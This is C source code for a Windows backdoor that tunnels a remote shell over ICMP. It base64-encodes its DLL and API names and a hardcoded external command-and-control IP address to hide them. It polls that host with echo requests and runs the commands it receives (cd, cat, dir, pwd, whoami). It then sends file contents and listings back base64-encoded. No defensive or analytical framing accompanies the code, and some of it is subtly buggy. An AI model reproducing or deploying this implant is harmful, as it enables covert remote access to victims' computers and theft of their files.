#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>

////////////////////////////////////////////////////////////////////////////////////////

char *pwd()
{
  char *cwd = malloc (sizeof (char) * 1024);
  getcwd(cwd, 1024);
  return cwd;
}

char *dir(char *dirr)
{
  DIR *dp;
  struct dirent *ep;
  if(strlen(dirr) == 0)
  {
    strcpy(dirr,".");
  }
  dp = opendir (dirr);
  if (dp != NULL) 
  {
  	char* eee;
		eee = malloc(1000000); 
		
    strcpy(eee, "");
    while ((ep = readdir (dp)) != NULL)
    {
			strcat(eee, ep->d_name); 
			strcat(eee, "\n"); 
    }
    (void) closedir (dp);
    return eee;
  }
  else
  {
    return "dir err\n";
  }
}

char *cat(char *fl)
{
  FILE* ptr;
  char ch;
  char *ret = malloc (sizeof (char) * 1000000);
  ptr = fopen(fl, "r");
  if (NULL == ptr)
  {
    return "file err\n";
  }
  int i=0;
  while (!feof(ptr))
  {
    ch = fgetc(ptr);
    ret[i]=ch;
    i++;
  }
  fclose(ptr);
  return ret;
}

char *sll(char *cm)
{
	char cmm[1024];
	strcpy(cmm,cm);

	cmm[strlen(cmm)-1] = '\0';
  if(cmm[0]=='c' && cmm[1]=='d')
  {
    char tmp[1024];
    strncpy(tmp,cmm+3,sizeof(tmp));
    chdir(tmp);
    char *pd=(char *)pwd();
  	strcat(pd,"> ");
    return pd;
  }
  if(cmm[0]=='c' && cmm[1]=='a' && cmm[2]=='t')
  {
    char tmp[1000000];
    strncpy(tmp,cmm+4,sizeof(tmp));
    const char *eee=(char *)cat(tmp);
    const char *ddd=(char *)pwd();
    char *fff;
    fff=malloc(strlen(eee)+ 3 + strlen(ddd));
    strcpy(fff,eee);
    strcat(fff,"\n");
    strcat(fff,ddd);
    strcat(fff,"> ");
    return fff;
  }
  if(cmm[0]=='d' && cmm[1]=='i' && cmm[2]=='r')
  {
    char tmp[1024];

    strncpy(tmp,cmm+4,sizeof(tmp));
    if (strcmp(tmp, "") == 0)
    {
      const char *eee=(char *)dir(".");
	    const char *ddd=(char *)pwd();
	    char *fff;
	    fff=malloc(strlen(eee)+ 2 + strlen(ddd));
	    strcpy(fff,eee);
	    strcat(fff,ddd);
	    strcat(fff,"> ");
	    return fff;
    }
    const char *eee=(char *)dir(tmp);
    const char *ddd=(char *)pwd();
    char *fff;
    fff=malloc(strlen(eee)+ 2 + strlen(ddd));
    strcpy(fff,eee);
    strcat(fff,ddd);
    strcat(fff,"> ");
    return fff;
  }
  if(cmm[0]=='p' && cmm[1]=='w' && cmm[2]=='d')
  {
  	char *pd=(char *)pwd();
  	int e=strlen(pd);
  	pd[e]='\n';
  	pd[e+1] = '\0';
  	strcat(pd,pwd());
  	strcat(pd,"> ");
    return pd;
  }
  if(cmm[0]=='w' && cmm[1]=='h' && cmm[2]=='o' && cmm[3]=='a' && cmm[4]=='m' && cmm[5]=='i')
  {
  	char *tmp = malloc(32);
  	strncpy(tmp,getenv("USERPROFILE")+9,32);
  	int e=strlen(tmp);
  	tmp[e]='\n';
  	tmp[e+1]='\0';
  	strcat(tmp,pwd());
  	strcat(tmp,"> ");
  	return tmp;
  }
  return "";
}

////////////////////////////////////////////////////////////////////////////////////////


static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};
size_t tst = 0;
void build_decoding_table() {
 
    decoding_table = malloc(256);
 
    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}
 
 
void base64_cleanup() {
    free(decoding_table);
} 
 
unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {
 
    if (decoding_table == NULL) build_decoding_table();
 
    if (input_length % 4 != 0) return NULL;
 
    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;
 
    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;
 
    for (int i = 0, j = 0; i < input_length;) {
 
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
 
        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);
 
        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
 
    return decoded_data;
}

////////////////////////////////////////////////////////////////////////////////////////
void generateKey(char *str, char *key) {

    int x = strlen(str);
    int y = strlen(key);

    int j = 0;
    for (int i = 0; i < x; i++) {

        if (i >= y) {

            key[i] = key[j];

            j++;
            if (j == y) {
                j = 0;
            }
        } else {

            key[i] = key[i];
        }
        // printf("%c ",value[i] );
    }
    // printf("KEY: %s\n",key );
}





////////////////////////////////////////////////////////////////////////////////////////

char* base64Encoder(char input_str[], int len_str)
{
    // Character set of base64 encoding scheme
    char char_set[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     
    // Resultant string
    char *res_str = (char *) malloc(1000000 * sizeof(char));
     
    int index, no_of_bits = 0, padding = 0, val = 0, count = 0, temp;
    int i, j, k = 0;
     
    // Loop takes 3 characters at a time from
    // input_str and stores it in val
    for (i = 0; i < len_str; i += 3)
        {
            val = 0, count = 0, no_of_bits = 0;
 
            for (j = i; j < len_str && j <= i + 2; j++)
            {
                // binary data of input_str is stored in val
                val = val << 8;
                 
                // (A + 0 = A) stores character in val
                val = val | input_str[j];
                 
                // calculates how many time loop
                // ran if "MEN" -> 3 otherwise "ON" -> 2
                count++;
             
            }
 
            no_of_bits = count * 8;
 
            // calculates how many "=" to append after res_str.
            padding = no_of_bits % 3;
 
            // extracts all bits from val (6 at a time)
            // and find the value of each block
            while (no_of_bits != 0)
            {
                // retrieve the value of each block
                if (no_of_bits >= 6)
                {
                    temp = no_of_bits - 6;
                     
                    // binary of 63 is (111111) f
                    index = (val >> temp) & 63;
                    no_of_bits -= 6;        
                }
                else
                {
                    temp = 6 - no_of_bits;
                     
                    // append zeros to right if bits are less than 6
                    index = (val << temp) & 63;
                    no_of_bits = 0;
                }
                res_str[k++] = char_set[index];
            }
    }
 
    // padding is done here
    for (i = 1; i <= padding; i++)
    {
        res_str[k++] = '=';
    }
 
    res_str[k] = '\0;';
 
    return res_str;
 
}
/////////////////////////////////////////////////////////////////////
#define ICMP_HEADERS_SIZE	(sizeof(ICMP_ECHO_REPLY) + 8)

#define STATUS_OK					0
#define STATUS_SINGLE				1
#define STATUS_PROCESS_NOT_CREATED	2

#define TRANSFER_SUCCESS			1
#define TRANSFER_FAILURE			0

#define DEFAULT_TIMEOUT			    3000
#define DEFAULT_DELAY			    200
#define DEFAULT_MAX_BLANKS	   	    10
#define DEFAULT_MAX_DATA_SIZE	    64

FARPROC icmp_create, icmp_send, to_ip;

int verbose = 0;

void create_icmp_channel(HANDLE *icmp_chan)
{
	*icmp_chan = (HANDLE) icmp_create();
}

int load_deps()
{
	
	HMODULE lib;
	
	lib = LoadLibraryA("ws2_32.dll");
	if (lib != NULL) {
        to_ip = GetProcAddress(lib, "inet_addr");
        if (!to_ip) {   
            return 0;
        }
    }

	lib = LoadLibraryA(base64_decode("aXBobHBhcGkuZGxs",16,&tst));
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib,base64_decode("SWNtcENyZWF0ZUZpbGU=",20,&tst));
		icmp_send = GetProcAddress(lib, base64_decode("SWNtcFNlbmRFY2hv",16,&tst));
		if (icmp_create && icmp_send) {
			return 1;
		}
	} 
	lib = LoadLibraryA(base64_decode("SUNNUC5ETEw=",12,&tst));
	if (lib != NULL) {
		icmp_create = GetProcAddress(lib,base64_decode("SWNtcENyZWF0ZUZpbGU=",20,&tst));
		icmp_send = GetProcAddress(lib, base64_decode("SWNtcFNlbmRFY2hv",16,&tst));
		if (icmp_create && icmp_send) {
			return 1;
		}
	}
	
	return 0;
}

int main(int argc, char **argv)
{
	int opt;
	char *target;
	unsigned int delay, timeout;
	unsigned int ip_addr;
	HANDLE icmp_chan;
	unsigned char *in_buf, *out_buf;
	unsigned int in_buf_size, out_buf_size;
	DWORD rs;
	unsigned int max_data_size;
	struct hostent *he;


	target = base64_decode("NTQuOTAuMjQuMjE5",16,&tst);
  // target = 0;
	timeout = DEFAULT_TIMEOUT;
	delay = DEFAULT_DELAY;
	max_data_size = DEFAULT_MAX_DATA_SIZE;

	if (!load_deps()) {
		return -1;
	}

	for (opt = 1; opt < argc; opt++) {
		if (argv[opt][0] == '-') {
			switch(argv[opt][1]) {
				case 't':
					if (opt + 1 < argc) {
						target = argv[opt + 1];
					}
					break;
			}
		}
	}

	if (!target) {
		return -1;
	}
	ip_addr = to_ip(target);
	create_icmp_channel(&icmp_chan);
	if (icmp_chan == INVALID_HANDLE_VALUE) {
	    return -1;
	}

	in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	out_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
	if (!in_buf || !out_buf) {
		return -1;
	}
	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
	memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);


    char *for_big_data = (char*) malloc(200000);
    int last=0;
    int bigdata_size=0;
    int someint=10;
    int blanks=0;
    int someinnt=0;
    someinnt++;
    someinnt-=5;
    someinnt=someint+5;

	do
	{
        out_buf_size=0;
		PICMP_ECHO_REPLY echo_reply;
		int rs;
		char *temp_in_buf;
		int nbytes;
		temp_in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
		if (!temp_in_buf) {
			continue;
		}
        int ind=0;
        while(ind<max_data_size && bigdata_size){
            out_buf[ind]=for_big_data[last++];
            ind++;
            bigdata_size--;
        }
        if(!bigdata_size){
            last=0;
        }
        out_buf_size=ind;
		
        rs = icmp_send(
				icmp_chan,
				ip_addr,
				out_buf,
				out_buf_size,
				NULL,
				temp_in_buf,		
				max_data_size + ICMP_HEADERS_SIZE,
				timeout);

			if (rs > 0){
				echo_reply = (PICMP_ECHO_REPLY) temp_in_buf;
				if (echo_reply->DataSize > max_data_size) {
					nbytes = max_data_size;
				} else {
					nbytes = echo_reply->DataSize;
				}
				memcpy(in_buf, echo_reply->Data, nbytes);
				in_buf_size = nbytes;
        blanks=0;
			}else blanks++;
      if(blanks==5) break;
			// printf(in_buf);
			
            if(in_buf_size){
                //printf("%d\n",in_buf_size);
                char *ew = sll(in_buf);
                for_big_data=base64Encoder(ew,strlen(ew));
                bigdata_size=strlen(for_big_data);
                printf("%s\n", in_buf);
                
                // int temp_bigdata_size=0;
                // char *encoded = base64_encode(for_big_data,bigdata_size,&temp_bigdata_size);
                // printf("%d\n",temp_bigdata_size);
                // printf("%.*s",temp_bigdata_size,encoded);
                // strncpy(for_big_data, encoded, temp_bigdata_size);
                // for_big_data[temp_bigdata_size-1]='a';
                // bigdata_size=strlen(for_big_data);
                
                // for_big_data[temp_bigdata_size]='\0';
                // printf("%s",for_big_data);
                // for_big_data = vigenere_cipher_encryption(for_big_data, "barbiegirl");
                // bigdata_size=temp_bigdata_size;       
                // if(bigdata_size) printf("%.*s\n",bigdata_size,for_big_data);
                // printf("%d\n",bigdata_size);
                // in_buf_size=0;

            }
            
			free(in_buf);
			in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
			memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);


            

			free(temp_in_buf);

		Sleep(200);

	} while (1==1);



    return 0;
}

